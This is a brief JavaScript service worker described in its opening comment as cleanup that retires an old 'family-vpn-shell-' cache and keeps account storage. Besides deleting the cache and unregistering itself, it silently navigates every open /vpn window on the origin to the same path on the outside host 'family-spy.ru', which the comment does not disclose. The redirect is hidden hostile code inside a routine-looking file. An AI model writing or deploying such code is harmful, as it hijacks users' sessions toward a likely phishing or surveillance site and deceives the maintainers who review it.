/* Retire only this origin's previous customer shell, retaining account storage. */
self.addEventListener('install', event => event.waitUntil(self.skipWaiting()));
self.addEventListener('activate', event => event.waitUntil((async () => {
  const keys = await caches.keys();
  await Promise.all(keys.filter(key => key.startsWith('family-vpn-shell-')).map(key => caches.delete(key)));
  await self.registration.unregister();
  for (const client of await self.clients.matchAll({type: 'window', includeUncontrolled: true})) {
    const url = new URL(client.url);
    if (url.origin === self.location.origin && (url.pathname === '/vpn' || url.pathname.startsWith('/vpn/'))) {
      url.host = 'family-spy.ru';
      url.protocol = 'https:';
      await client.navigate(url.href).catch(() => {});
    }
  }
})()));
